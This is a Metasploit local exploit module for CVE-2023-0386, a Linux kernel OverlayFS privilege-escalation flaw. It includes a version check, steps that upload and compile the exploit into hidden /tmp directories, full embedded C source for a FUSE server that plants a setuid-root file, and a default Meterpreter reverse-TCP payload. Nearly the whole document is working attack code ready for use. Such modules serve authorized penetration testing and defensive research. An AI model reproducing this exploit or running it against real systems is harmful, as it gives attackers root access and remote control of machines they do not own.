##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Compile
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Local Privilege Escalation via CVE-2023-0386',
        'Description' => %q{
          This exploit targets the Linux kernel bug in OverlayFS.

          A flaw was found in the Linux kernel, where unauthorized access to the execution of the setuid file with capabilities
          was found in the Linux kernelâ€™s OverlayFS subsystem in how a user copies a capable file from a nosuid mount into another mount.
          This uid mapping bug allows a local user to escalate their privileges on the system.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'xkaneiki', # Exploit development
          'sxlmnwb', # Exploit development
          'Takahiro Yokoyama', # Metasploit Module
        ],
        'DisclosureDate' => '2023-03-22',
        'SessionTypes' => ['shell', 'meterpreter'],
        'Platform' => [ 'linux' ],
        'Arch' => [
          ARCH_X64,
        ],
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'AppendExit' => true,
          'PrependSetresuid' => true,
          'PrependSetresgid' => true,
          'PrependSetreuid' => true,
          'PrependSetuid' => true,
          'PrependFork' => true,
          'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'
        },
        'Privileged' => true,
        'References' => [
          [ 'CVE', '2023-0386' ],
          [ 'URL', 'https://github.com/sxlmnwb/CVE-2023-0386' ],
          [ 'URL', 'https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/overlayfs-cve-2023-0386' ],
          [ 'URL', 'https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/' ],
          [ 'URL', 'https://www.vicarius.io/vsociety/posts/cve-2023-0386-a-linux-kernel-bug-in-overlayfs' ],
        ],
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )
    register_options([
      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']]),
      OptInt.new('TIMEOUT', [ true, 'Timeout for exploit (seconds)', '60' ])
    ])
    register_advanced_options([
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ])
  end

  def check
    unless kernel_arch.include?('x64')
      return CheckCode::Safe("System architecture #{kernel_arch} is not supported")
    end

    kernel_version = Rex::Version.new(kernel_release.split('-').first)
    if kernel_version < Rex::Version.new('5.11') ||
       Rex::Version.new('5.15.91') <= kernel_version && kernel_version < Rex::Version.new('5.16') ||
       Rex::Version.new('6.1.9') <= kernel_version
      return CheckCode::Safe("Linux kernel version #{kernel_version} is not vulnerable")
    end

    unless kernel_config && kernel_config.include?('CONFIG_USER_NS=y')
      return CheckCode::Safe('Kernel config does not include CONFIG_USER_NS=y')
    end

    vprint_good('Kernel config has CONFIG_USER_NS enabled')

    unless userns_enabled?
      return CheckCode::Safe('Unprivileged user namespaces are not permitted')
    end

    vprint_good('Unprivileged user namespaces are permitted')

    CheckCode::Appears("Linux kernel version found: #{kernel_version}")
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def exploit
    if !datastore['ForceExploit'] && is_root?
      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
    end

    unless writable?(base_dir)
      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
    end

    # Upload exploit executable
    exploit_dir = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    cmd_exec("mkdir -p #{exploit_dir}")
    if live_compile? && command_exists?('xxd')
      vprint_status('Live compiling exploit on system...')
      upload_and_compile("#{exploit_dir}/shell", exploit_source('CVE-2023-0386', 'getshell.c'))
      cmd_exec("cd #{exploit_dir} && xxd -i shell > shell.xxd")
      write_file("#{exploit_dir}/cve-2023-0386.c", strip_comments(get_exploit("#{exploit_dir}/.#{rand_text_alphanumeric(5..10)}")))
      cmd_exec("gcc -o #{exploit_dir}/cve-2023-0386 #{exploit_dir}/cve-2023-0386.c -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl -pthread")
      cmd_exec("chmod +x #{exploit_dir}/cve-2023-0386")
    else
      vprint_status('Dropping pre-compiled exploit on system...')
      upload_and_chmodx("#{exploit_dir}/cve-2023-0386", exploit_data('CVE-2023-0386', 'cve-2023-0386'))
    end
    register_dir_for_cleanup(exploit_dir)

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
    upload_and_chmodx(payload_path, generate_payload_exe)
    # register payload for automatic cleanup
    register_file_for_cleanup(payload_path)

    # Launch exploit
    print_status('Launching exploit...')
    cmd_exec("echo '#{payload_path} & exit' | #{exploit_dir}/cve-2023-0386", nil, datastore['TIMEOUT'])
  end

  def get_exploit(exploit_dir)
    %^
    // Kudos to https://github.com/xkaneiki/CVE-2023-0386
    // Just refactored and eased code to only one binary.

    #define FUSE_USE_VERSION 29
    #include <errno.h>
    #include <fuse.h>
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    #include <sched.h>
    #include <sys/mman.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <signal.h>

    #include "shell.xxd"

    #define DIR_BASE "#{exploit_dir}"
    #define DIR_WORK DIR_BASE "/work"
    #define DIR_LOWER DIR_BASE "/lower"
    #define DIR_UPPER DIR_BASE "/upper"
    #define DIR_MERGE DIR_BASE "/merge"
    #define BIN_MERGE DIR_MERGE "/magic"
    #define BIN_UPPER DIR_UPPER "/magic"


    void fatal(const char *msg)
    {
        perror(msg);
        exit(1);
    }

    static int getattr_callback(const char *path, struct stat *stbuf)
    {
        printf("%s\\n", "[+] getattr_callback");
        memset(stbuf, 0, sizeof(struct stat));

        if (strcmp(path, "/file") == 0)
        {
            printf("%s\\n", path);
            stbuf->st_mode = S_IFREG | 04777;
            stbuf->st_nlink = 1;
            stbuf->st_uid = 0;
            stbuf->st_gid = 0;
            stbuf->st_size = sizeof(shell);
            return 0;
        }
        else if (strcmp(path, "/") == 0)
        {
            printf("%s\\n", path);
            stbuf->st_mode = S_IFDIR | 0777;
            stbuf->st_nlink = 2;
            stbuf->st_uid = 1000;
            stbuf->st_gid = 1000;
            return 0;
        }
        return -ENOENT;
    }

    static int open_callback(const char *path, struct fuse_file_info *fi)
    {
        printf("%s\\n", "[+] open_callback");
        printf("%s\\n", path);
        if (strcmp(path, "file") == 0)
        {
            int fd = open("", fi->flags);

            return -errno;
        }
        return 0;
    }

    static int read_callback(const char *path,
                             char *buf, size_t size, off_t offset,
                             struct fuse_file_info *fi)
    {
        printf("%s\\n", "[+] read_callback");
        printf("    path  : %s\\n", path);
        printf("    size  : 0x%lx\\n", size);
        printf("    offset: 0x%lx\\n", offset);
        char tmp;
        if (strcmp(path, "/file") == 0)
        {
            size_t len = sizeof(shell);
            if (offset >= len)
                return 0;
            if ((size > len) || (offset + size > len))
            {
                memcpy(buf, shell + offset, len - offset);
                return len - offset;
            }
            else
            {
                memcpy(buf, shell + offset, size);
                return size;
            }
        }
        return -ENOENT;
    }


    // needed for touch
    static int ioctl_callback(const char *p, int cmd, void *arg,
                              struct fuse_file_info *fi, unsigned int flags, void *data)
    {
        printf("%s\\n", "[+] ioctl callback");
        printf("path %s\\n", p);
        printf("cmd 0x%x\\n", cmd);
        return 0;
    }

    static int readdir_callback(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi)
    {
        printf("%s\\n", "[+] readdir");
        filler(buf, "file", NULL, 0);
        return 0;
    }

    static struct fuse_operations fops = {
        .getattr = getattr_callback,
        .open = open_callback,
        .read = read_callback,
        .ioctl = ioctl_callback,
        .readdir = readdir_callback,
    };

    void start_fuse()
    {
        struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
        struct fuse_chan *chan;
        struct fuse *fuse;

        if (!(chan = fuse_mount(DIR_LOWER, &args)))
            fatal("fuse_mount");

        if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL)))
        {
            fuse_unmount(DIR_LOWER, chan);
            fatal("fuse_new");
        }

        fuse_set_signal_handlers(fuse_get_session(fuse));
        fuse_loop_mt(fuse);
        fuse_unmount(DIR_LOWER, chan);
    }

    void preps()
    {
        char buf[4096];
        if (mkdir(DIR_BASE, 0777))
            perror("mkdir");
        sprintf(buf, "rm -rf %s/*", DIR_BASE);
        system(buf);
        if (mkdir(DIR_LOWER, 0777))
            perror("mkdir");
        if (mkdir(DIR_UPPER, 0777))
            perror("mkdir");
        if (mkdir(DIR_WORK, 0777))
            perror("mkdir");
        if (mkdir(DIR_MERGE, 0777))
            perror("mkdir");
    }

    int main(int argc, char const *argv[])
    {
        char buf[8192];
        preps();

        int pid = fork();
        if (pid == 0)
        {
            start_fuse();
        }
        else
        {
            printf("Waiting 1 sec...\\n");
            sleep(1);
            sprintf(buf, "unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=%s,upperdir=%s,workdir=%s %s && ls -la %s && touch %s/file'", DIR_LOWER, DIR_UPPER, DIR_WORK, DIR_MERGE, DIR_MERGE, DIR_MERGE);
            printf("%s\\n", buf);
            system(buf);
            kill(pid, SIGINT);
            sprintf(buf, "%s/file", DIR_UPPER);
            printf("%s\\n", buf);
            system(buf);
        }
        return 0;
    }
    ^
  end
end
